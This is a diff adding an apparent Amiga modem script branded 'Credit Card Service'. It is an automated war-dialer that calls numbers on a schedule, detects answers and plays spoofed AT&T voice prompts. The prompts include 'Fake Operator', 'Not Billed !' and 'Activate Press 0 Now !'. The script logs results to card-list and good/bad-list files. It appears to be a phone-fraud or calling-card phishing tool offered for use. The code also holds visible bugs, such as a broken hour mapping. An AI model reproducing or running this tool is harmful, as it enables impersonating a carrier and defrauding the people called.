+	Print Local "01) 00:00    08) 07:00    15) 14:00    22) 22:00"
+	Print Local "02) 01:00    09) 08:00    16) 15:00    23) 23:00"
+	Print Local "03) 02:00    10) 09:00    17) 16:00    24)      "
+	Print Local "04) 03:00    11) 10:00    18) 17:00    25)      "
+	Print Local "05) 04:00    12) 11:00    19) 18:00    26)      "
+	Print Local "06) 05:00    13) 12:00    20) 19:00    27)      "
+	Print Local "07) 06:00    14) 13:00    21) 20:00    28)      "
+	print Local
+	Input Local "[33mSelect Start Hour[0m >: ",HT$
+	 If HT$=="0"
+	  HT$="00"
+	 Endif
+	 If HT$=="1"
+	  HT$="01"
+	 Endif
+	 If HT$=="2"
+	  HT$="02"
+	 Endif
+	 If HT$=="3"
+	  HT$="03"
+	 Endif
+	 If HT$=="4"
+	  HT$="04"
+	 Endif
+	 If HT$=="5"
+	  HT$="05"
+	 Endif
+	 If HT$=="6"
+	  HT$="07"
+	 Endif
+	 If HT$=="8"
+	  HT$="08"
+	 Endif
+	 If HT$=="9"
+	  HT$="09"
+	 Endif
+	 If HT$=="10"
+	  HT$="10"
+	 Endif
+	 If HT$=="10"
+	  HT$="10"
+	 Endif
+	 If HT$=="11"
+	  HT$="11"
+	 Endif
+	 If HT$=="12"
+	  HT$="12"
+	 Endif
+	 If HT$=="13"
+	  HT$="13"
+	 Endif
+	 If HT$=="14"
+	  HT$="14"
+	 Endif
+	 If HT$=="15"
+	  HT$="15"
+	 Endif
+	 If HT$=="16"
+	  HT$="16"
+	 Endif
+	 If HT$=="17"
+	  HT$="17"
+	 Endif
+	 If HT$=="18"
+	  HT$="18"
+	 Endif
+	 If HT$=="19"
+	  HT$="19"
+	 Endif
+	 If HT$=="20"
+	  HT$="20"
+	 Endif
+	 If HT$=="21"
+	  HT$="21"
+	 Endif
+	 If HT$=="22"
+	  HT$="22"
+	 Endif
+	 If HT$=="23"
+	  HT$="23"
+	 Endif
+	 If HT$=="24"
+	  HT$="00"
+	 Endif
+	 If HT$==""
+	  HT$="--:--:--"
+	  RETURN
+	 Endif
+	  ST$==HT$+":00:00"
+	  Goto Endless
+	endif
+	if I$=="-"
+	CLS
+	Print Local "                                                    ###"
+	Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+	Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+	Print Local
+	Print Local " -*- Timing END Control Menu -*-"
+	Print Local
+	Print Local "01) 00:00    08) 07:00    15) 14:00    22) 22:00"
+	Print Local "02) 01:00    09) 08:00    16) 15:00    23) 23:00"
+	Print Local "03) 02:00    10) 09:00    17) 16:00    24)      "
+	Print Local "04) 03:00    11) 10:00    18) 17:00    25)      "
+	Print Local "05) 04:00    12) 11:00    19) 18:00    26)      "
+	Print Local "06) 05:00    13) 12:00    20) 19:00    27)      "
+	Print Local "07) 06:00    14) 13:00    21) 20:00    28)      "
+	print Local
+	Input Local "[33mSelect END Hour[0m >: ",HH$
+	 If HH$=="0"
+	  HH$="00"
+	 Endif
+	 If HH$=="1"
+	  HH$="01"
+	 Endif
+	 If HH$=="2"
+	  HH$="02"
+	 Endif
+	 If HH$=="3"
+	  HH$="03"
+	 Endif
+	 If HH$=="4"
+	  HH$="04"
+	 Endif
+	 If HH$=="5"
+	  HH$="05"
+	 Endif
+	 If HH$=="6"
+	  HH$="07"
+	 Endif
+	 If HH$=="8"
+	  HH$="08"
+	 Endif
+	 If HH$=="9"
+	  HH$="09"
+	 Endif
+	 If HH$=="10"
+	  HH$="10"
+	 Endif
+	 If HH$=="10"
+	  HH$="10"
+	 Endif
+	 If HH$=="11"
+	  HH$="11"
+	 Endif
+	 If HH$=="12"
+	  HH$="12"
+	 Endif
+	 If HH$=="13"
+	  HH$="13"
+	 Endif
+	 If HH$=="14"
+	  HH$="14"
+	 Endif
+	 If HH$=="15"
+	  HH$="15"
+	 Endif
+	 If HH$=="16"
+	  HH$="16"
+	 Endif
+	 If HH$=="17"
+	  HH$="17"
+	 Endif
+	 If HH$=="18"
+	  HH$="18"
+	 Endif
+	 If HH$=="19"
+	  HH$="19"
+	 Endif
+	 If HH$=="20"
+	  HH$="20"
+	 Endif
+	 If HH$=="21"
+	  HH$="21"
+	 Endif
+	 If HH$=="22"
+	  HH$="22"
+	 Endif
+	 If HH$=="23"
+	  HH$="23"
+	 Endif
+	 If HH$=="24"
+	  HH$="00"
+	 Endif
+	 If HH$==""
+	  HH$="--:--:--"
+	  RETURN
+	 Endif
+	  ET$==HH$+":00:00"
+	  Goto Endless
+	endif
+
+	RETURN
+END
+
+
+TERMINATED:
+ST$="--:--:--"
+ET$="--:--:--"
+HT$="--:--:--"
+HH$="--:--:--"
+Close #99
+IF Dirlog$ != ""
+ OPEN	Input 1,Dirlog$+A$
+  read #1, B$
+  CLOSE #1
+Endif
+
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- DIALER PROCESS RESULT -*-"
+Print Local
+Print Local "[33m Last Areacode.....[0m>: "A$
+Print Local "[33m Last State........[0m>: "ASD1$
+Print Local "[33m Area[0m([33ms[0m)[33mSelected...[0m>: "C
+Print Local "[33m Last Phone........[0m>: "VER
+Print Local "[33m Calls Executed....[0m>: "CN
+Print Local "[33m MAX Calls ........[0m>: "MC
+Print Local "[33m Start Time........[0m>: "ST$
+Print Local "[33m End Time..........[0m>: "Time$
+Print Local
+Print Local
+ALARM
+ASK LOCAL "[33mPress Return[0m .....  ",P$
+ DLS$="N"
+ GOTO MAINMENU
+END
+
+
+
+
+HACK:
+CLS
+ Print Local "                                                    ###"
+ Print Local " [0m Credit Card Service V."Version$"      Time:"time$ "   [0m   [0m@ @[0m    [0mDate:"date$
+ Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+ Print Local
+ Print Local " -*- Automatic Sequence Initialize -*-"
+ Print Local
+RING = 0
+pause 2
+send "ate0^M"
+wait 3 "OK"
+send "at#cls=8^M"
+wait 3 "OK"
+send "at#vrn=255^M"
+wait 3 "OK"
+send "at#vgt=0^M"
+wait 3 "OK"
+send "ate1^M"
+wait 3 "OK"
+send "atd^M"
+
+
+
+RINGDETECT:
+RING=RING+1
+If RING >= 5
+ Goto Skip
+endif
+
+CLS
+ Print Local "                                                    ###"
+ Print Local " [0m Credit Card Service V."Version$"      Time:"time$ "   [0m   [0m@ @[0m    [0mDate:"date$
+ Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+ Print Local
+ Print Local " -*- Dialer Control Menu -*-"
+ Print Local
+ Print Local "[33mAutomatic Dialing Routine[0m.....>: ";CN;" [33mcalls[0m ";A4;" [33mSteps[0m "
+ Print Local "[33mCurrent Time/Date[0m.............>: ";time$,;date$
+ Print Local "[33mNow Dialing[0m...................>: " A$+Ver$
+ Print Local "[33mArea Time[0m.....................>: " timeh$+":"+timem$+":00"
+ Print Local "[33mRing Detects[0m..................>: " RING
+ Print Local
+ Print Local ;"[33mPress [0m- [33mFor ManualMenu [0m+ [33mTo Skip Call or [0m* [33mNOW to ABORT[0m ... ";
+
+	WHEN 1 "RINGING" Goto RINGDETECT
+	WHEN 2 "NO ANSWER" Goto Skip
+	WHEN 3 "NO CARRIER" Goto Skip
+	WHEN 4 "BUSY" Goto Skip
+	WHEN 5 "+" Goto Skip
+	WHEN 6 "-" Goto ManualMenu
+	WHEN 7 "*" Goto Abort
+	WHEN 8 "VCON" Goto EMER
+	Wait 40
+goto RINGDETECT
+
+EMER:
+
+If Ring <= 1
+ Goto Skip
+endif
+
+send "ATE0^M"
+wait 3 "OK"
+/*send "at#cls=8^M"
+wait 3 "OK"
+send "at#vls=6^M"
+wait 3 "VCON"*/
+send "at#vgt=0^M"
+wait 3 "OK"
+wait 5
+CLS
+ Print Local "                                                    ###"
+ Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+ Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+ Print Local
+ Print Local " -*- Dialer Control Menu RTN -*-"
+ print local
+ print local "[33mAutomatic Dialing Routine[0m.....>: ";CN;" [33mcalls[0m ";A4;" [33mSteps[0m "
+ print local "[33mCurrent Time/Date[0m.............>: ";time$,;date$
+ Print Local "[33mNow Dialing[0m...................>: " A$+Ver$
+ Print Local "[33mArea Time[0m.....................>: " timeh$+":"+timem$+":00"
+ Print Local "[33mRing Detects[0m..................>: " RING
+ Print Local "[33mPlaying[0m.......................>: " Comment01$
+
+execute Player$ + Module01$
+send "~~~ate1^M"
+wait 3 "OK"
+ CLS
+ Print Local "                                                    ###"
+ Print Local " [0m Credit Card Service V."Version$"     Time:"time$   "   [0m   [0m@ @[0m    [0mDate:"date$
+ Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+ Print Local
+ Print Local " -*- Dialer Control Menu RTN -*-"
+ print local
+ print local "[33mAutomatic Dialing Routine[0m.....>: ";CN;" [33mcalls[0m ";A4;" [33mSteps[0m "
+ print local "[33mCurrent Time/Date[0m.............>: ";time$,;date$
+ Print Local "[33mNow Dialing[0m...................>: " A$+Ver$
+ Print Local "[33mArea Time[0m.....................>: " timeh$+":"+timem$+":00"
+ Print Local "[33mRing Detects[0m..................>: " RING
+ Print Local "[33mPlaying[0m.......................>: " Comment09$
+ print local
+ Print Local "[33mPress [0m- [33mFor ManualMenu [0m+ [33mTo Skip Call or [0m* [33mNOW to ABORT[0m"
+
+	WHEN 1 "RINGING" Goto Skip
+	WHEN 2 "NO ANSWER" Goto Skip
+	WHEN 3 "NO CARRIER" Goto Skip
+	WHEN 4 "BUSY" Goto Skip
+	WHEN 5 "+" Goto Skip
+	WHEN 6 "-" Goto ManualMenu
+	WHEN 7 "*" Goto Abort
+	Wait 10
+execute Player$ + Module09$
+Goto manualmenu
+
+END
+
+
+Write_def:
+CLS
+Print Local "Missing Prefs ... Writing Default Prefs ..."
+Pause 1
+	open Output 1, "ENVARC:Dialer00.prefs"
+	write #1,""
+	write #1,""
+	write #1,"atx5e0m2^M"
+	write #1,"5"
+	write #1,"11"
+	write #1,"ATDT"
+	write #1,"ATDT"
+	write #1,"1721011"
+	write #1,"0##"
+	write #1,"111"
+	write #1,"AT&T:Cards/CardList_"
+	write #1,"AT&T:/DirLog/Dialer_"
+	write #1,"6"
+	write #1,"3"
+	write #1,"2"
+	write #1,"1"
+	write #1,"7"
+	write #1,"0"
+	write #1,"0"
+	write #1,"0"
+	write #1,"0"
+	write #1,"0"
+	write #1,"play16"
+	write #1,"Output=Paula14 AT&T:Samples/EMER.IFF"
+	write #1,"Emergency Call ..."
+	write #1,"Output=Paula14 AT&T:Samples/AT&T.iff"
+	write #1,"At&t Welcome ..."
+	write #1,"Output=Paula14 AT&T:Samples/Redial.IFF"
+	write #1,"Please Redial ..."
+	write #1,"Output=Paula14 AT&T:Samples/at&t.thank"
+	write #1,"Thank ..."
+	write #1,"Output=paula14 AT&T:Samples/JACPLEASE.IFF"
+	write #1,"Jack Please ..."
+	write #1,"Output=paula14 AT&T:Samples/SORRY.IFF"
+	write #1,"Sorry :) ..."
+	write #1,"Output=Paula14 AT&T:Samples/Operator"
+	write #1,"Fake Operator"
+	write #1,"Output=Paula14 AT&T:Samples/No-Bill"
+	write #1,"Not Billed !"
+	write #1,"Output=Paula14 AT&T:Samples/Press0"
+	write #1,"Activate Press 0 Now !"
+	write #1,"0"
+	write #1,"0"
+	write #1,"At&T:Logs/Goodlist_"
+	write #1,"At&T:Logs/BadList_"
+	write #1,"At&T:TotalList"
+	write #1,"Ced"
+	Close #1
+	open Output 1, "ENV:Dialer00.prefs"
+	write #1,""
+	write #1,""
+	write #1,"atx5e0m2^M"
+	write #1,"5"
+	write #1,"11"
+	write #1,"ATDT"
+	write #1,"ATDT"
+	write #1,"1721011"
+	write #1,"0##"
+	write #1,"111"
+	write #1,"AT&T:Cards/CardList_"
+	write #1,"AT&T:/DirLog/Dialer_"
+	write #1,"6"
+	write #1,"3"
+	write #1,"2"
+	write #1,"1"
+	write #1,"7"
+	write #1,"0"
+	write #1,"0"
+	write #1,"0"
+	write #1,"0"
+	write #1,"0"
+	write #1,"play16"
+	write #1,"Output=Paula14 AT&T:Samples/EMER.IFF"
+	write #1,"Emergency Call ..."
+	write #1,"Output=Paula14 AT&T:Samples/AT&T.iff"
+	write #1,"At&t Welcome ..."
+	write #1,"Output=Paula14 AT&T:Samples/Redial.IFF"
+	write #1,"Please Redial ..."
+	write #1,"Output=Paula14 AT&T:Samples/at&t.thank"
+	write #1,"Thank ..."
+	write #1,"Output=paula14 AT&T:Samples/JACPLEASE.IFF"
+	write #1,"Jack Please ..."
+	write #1,"Output=paula14 AT&T:Samples/SORRY.IFF"
+	write #1,"Sorry :) ..."
+	write #1,"Output=Paula14 AT&T:Samples/Operator"
+	write #1,"Fake Operator"
+	write #1,"Output=Paula14 AT&T:Samples/No-Bill"
+	write #1,"Not Billed !"
+	write #1,"Output=Paula14 AT&T:Samples/Press0"
+	write #1,"Activate Press 0 Now !"
+	write #1,"0"
+	write #1,"0"
+	write #1,"At&T:Logs/Goodlist_"
+	write #1,"At&T:Logs/BadList_"
+	write #1,"At&T:TotalList"
+	write #1,"Ced"
+	Close #1
+     goto load
+     goto CONFIG
+Return
+
+CLOSEIT:
+Print Local
+Print Local "Exiting ..."
+send "~~~ATH0^M"
+Send "^M"
+send "~~~ATZ"
+Send "^M"
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local " Thank you for using our Service :)"
+ALARM
+END
+
+/* recorded script start */
+	SEND "a^H"
+	END
+/* recorded script end */
+/* recorded script start */
+	SEND "ati6\r"
+	WAIT "^M^J^M^JOK^M^J"
+	SEND "ati44\r"
+	WAIT "^JERROR^M^J"
+	SEND "atz\r"
+	END
+/* recorded script end */
+/* recorded script start */
+	END
+/* recorded script end */
+ 
+
+
+
